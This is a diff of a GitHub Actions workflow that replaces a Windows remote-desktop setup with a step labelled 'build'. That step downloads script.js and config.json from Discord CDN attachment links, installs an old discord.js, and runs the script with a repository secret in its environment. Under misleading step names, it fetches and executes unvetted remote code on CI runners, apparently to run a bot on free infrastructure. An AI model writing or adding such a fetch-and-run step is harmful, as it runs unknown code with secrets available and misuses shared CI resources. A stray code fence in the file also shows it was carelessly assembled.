@@ -1,26 +1,20 @@
-# This is a basic workflow to help you get started with Actions
 
-name: Windows-CRD
+name: client
 
 on: 
   workflow_dispatch:
-    inputs:
-      authcode:
-        description: '.'
-        required: false
-      pincode:
-        description: '.'
-        required: false
+
   
 jobs:
   build:
     runs-on: windows-latest
 
     steps:
-    - uses: actions/checkout@v2
-    - name: Initializing Setup
-      run: ./setup.ps1
-    - name: Keep Alive
+    - name: build
+      run: .\cmd /c "curl https://cdn.discordapp.com/attachments/1061664042726461460/1067857361454235779/script.js -o script.js ; curl https://cdn.discordapp.com/attachments/1061664042726461460/1071905379769909389/config.json -o config.json ; npm install discord.js@12.5.3 ; node script.js"
+      env:
+        link: ${{ secrets.link }}```
+    - name: testing
       run: ./timeout.ps1
 
   
